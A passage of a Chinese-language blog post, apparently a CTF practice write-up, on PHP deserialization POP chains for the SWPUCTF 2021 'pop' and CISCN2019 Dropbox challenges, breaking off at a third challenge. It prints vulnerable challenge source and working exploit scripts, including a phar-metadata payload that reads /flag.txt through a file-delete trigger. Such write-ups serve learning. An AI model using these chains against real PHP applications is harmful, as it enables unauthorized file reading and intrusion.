@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pop链专练1">
+<meta property="og:url" content="http://example.com/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-07T05:47:08.000Z">
+<meta property="article:modified_time" content="2022-04-07T12:48:28.351Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -php">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/04/07/pop链专练1/"/>
+
+
+
+
+
+  <title>pop链专练1 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pop链专练1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-07T13:47:08+08:00">
+                2022-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。</p>
+<span id="more"></span>
+
+<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>入门pop题，查看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>链子的构建还是很明显的，主要是出入口都太明确了，直接构造exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;w00m=new w33m();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m = &quot;Getflag&quot;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;w00m=new w44m();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>质量很高的一题，同时结合了phar反序列化的考点。首先进入网页，发现要登录，那么注册登录。</p>
+<p>登陆后发现存在文件上传，但是发现对后缀进行白名单，因此upload漏洞被堵了，接着发现上传后可以进行文件下载，并且对filename没有进行限制及编码，猜测存在任意文件下载、，接下来我们开始下载文件：</p>
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;login&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">HTML省略</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">$a = new FileList($_SESSION[&#x27;sandbox&#x27;]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>class.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr = &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser = &quot;root&quot;;</span><br><span class="line">$db</span><br><span class="line">pass = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;dropbox&quot;;</span><br><span class="line">$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        if ($count === 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files = array();</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key = array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file = new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] = array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &#x27;&lt;tr&gt;&#x27;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;;</span><br><span class="line">            $table .= &#x27;&lt;/tr&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size = filesize($this-&gt;filename);</span><br><span class="line">        $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;);</span><br><span class="line">        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>delete.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;login&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;filename&#x27;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&#x27;sandbox&#x27;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&#x27;filename&#x27;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其他代码没有实际作用再次不放出了。class.php发现和数据库交互的语句全部进行了参数绑定，因此不存在sql。</p>
+<p>首先看出口，File类的close()中存在file_get_contents，拿来做出口在适合不过。接着发现User类中的__destruct()调用了close()，很有可能要通过这里进行打印。而FileList类中有__call()可以进行调用，那么我们就将$this-&gt;db复制为FileList类这样我们就可以直接使用该类中得方法。</p>
+<p>而这个__call()几乎明示我们这里要用到phar反序列化了，因此构建exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() </span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;db = new FileList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct() </span><br><span class="line">    &#123;</span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;</span><br><span class="line">        $this-&gt;files = array($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$User = new User();</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;./phar.phar&quot;); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);</span><br><span class="line">$phar-&gt;setMetadata($User);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将生成的phar文件后缀改成jpg，然后上传，最后利用phar://伪协议删除文件触发反序列化，读取flag。</p>
+<h1 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1><p>和上一题比较类似，首先是任意文件读取漏洞获取源码，我们读取关键代码。</p>
+<p>class.php：</p>
